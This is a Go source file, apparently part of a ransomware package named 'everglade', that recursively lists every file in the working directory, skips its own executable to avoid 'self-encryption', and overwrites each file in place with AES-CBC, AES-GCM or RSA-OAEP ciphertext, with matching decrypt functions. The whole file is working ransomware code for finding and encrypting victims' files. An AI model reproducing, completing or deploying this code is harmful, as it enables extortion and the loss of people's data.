package everglade

import (
	"crypto/aes"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
)

type File struct {
	Name string
}

// FileList allows iterability and discovery. Also manages key
type FileList struct {
	Files []File
}

// addFile adds a  file to the FileList
func (fl *FileList) addFile(fn string) {
	fl.Files = append(fl.Files, NewFile(fn))
}

// NewFile creates a new file struct
func NewFile(fn string) File {
	return File{Name: fn}
}

// DiscoverFilesInDirectory automates discovery of files in directory and returns FileList
func DiscoverFilesInDirectory(dir, ex string) (error, FileList) {
	fl := FileList{}

	// Check to resolve self-encryption, defaults to linux
	fn := os.Args[0][2:]
	if runtime.GOOS == "windows" {
		fn = os.Args[0]
	}

	err := filepath.Walk(".",
		func(p string, info os.FileInfo, err error) error {
			if err != nil {
				return getError(fileWalkRead, err)
			}
			if !info.IsDir() && fn != p && p != ex {
				fl.addFile(p)
			}
			return nil
		})
	if err != nil {
		return getError(fileWalk, err), FileList{}
	}
	return nil, fl
}

// EncryptCBC encrypts a file with AES-CBC-256 using the given Object
func (f *File) EncryptCBC(obj Object) error {
	pt, err := ioutil.ReadFile(f.Name)
	if err != nil {
		return getError(readFile, err)
	}

	iv, ct := obj.EncryptCBC(pt)

	w, err := os.Create(f.Name)
	if err != nil {
		return getError(createFile, err)
	}

	defer w.Close()
	_, err = w.Write(append(iv,ct...))
	if err != nil {
		return getError(writeFile, err)
	}
	return nil
}

// DecryptCBC decrypts a file with AES-CBC-256 using the given Object
func (f *File) DecryptCBC(obj Object) error {
	d, err := ioutil.ReadFile(f.Name)
	if err != nil {
		return getError(readFile, err)
	}

	iv, ct := d[:aes.BlockSize], d[aes.BlockSize:]

	pt := obj.DecryptCBC(iv, ct)

	w, err := os.Create(f.Name)
	if err != nil {
		return getError(createFile, err)
	}

	defer w.Close()
	_, err = w.Write(pt)
	if err != nil {
		return getError(writeFile, err)
	}
	return nil
}

func (f *File) EncryptGCM(obj Object, ad []byte) error {
	pt, err := ioutil.ReadFile(f.Name)
	if err != nil {
		return getError(readFile, err)
	}

	n, ct := obj.EncryptGCM(pt, ad)

	w, err := os.Create(f.Name)
	if err != nil {
		return getError(createFile, err)
	}

	defer w.Close()
	_, err = w.Write(append(n,ct...))
	if err != nil {
		return getError(writeFile, err)
	}
	return nil
}

func (f *File) DecryptGCM(obj Object, ad []byte) error {
	d, err := ioutil.ReadFile(f.Name)
	if err != nil {
		return getError(readFile, err)
	}

	n, ct := d[:12], d[12:]

	pt := obj.DecryptGCM(n, ct, ad)

	w, err := os.Create(f.Name)
	if err != nil {
		return getError(createFile, err)
	}

	defer w.Close()
	_, err = w.Write(pt)
	if err != nil {
		return getError(writeFile, err)
	}
	return nil
}


func (f *File) EncryptOAEP(obj Object, l []byte) error {
	pt, err := ioutil.ReadFile(f.Name)
	if err != nil {
		return getError(readFile, err)
	}

	err, ct := obj.EncryptOAEP(pt, l)
	if err != nil {
		return getError(encryptFile, err)
	}

	w, err := os.Create(f.Name)
	if err != nil {
		return getError(createFile, err)
	}

	defer w.Close()
	_, err = w.Write(ct)
	if err != nil {
		return getError(writeFile, err)
	}
	return nil
}

func (f *File) DecryptOAEP(obj Object, l []byte) error {
	ct, err := ioutil.ReadFile(f.Name)
	if err != nil {
		return getError(readFile, err)
	}

	err, pt := obj.DecryptOAEP(ct, l)
	if err != nil {
		return getError(decryptFile, err)
	}

	w, err := os.Create(f.Name)
	if err != nil {
		return getError(createFile, err)
	}

	defer w.Close()
	_, err = w.Write(pt)
	if err != nil {
		return getError(writeFile, err)
	}
	return nil
}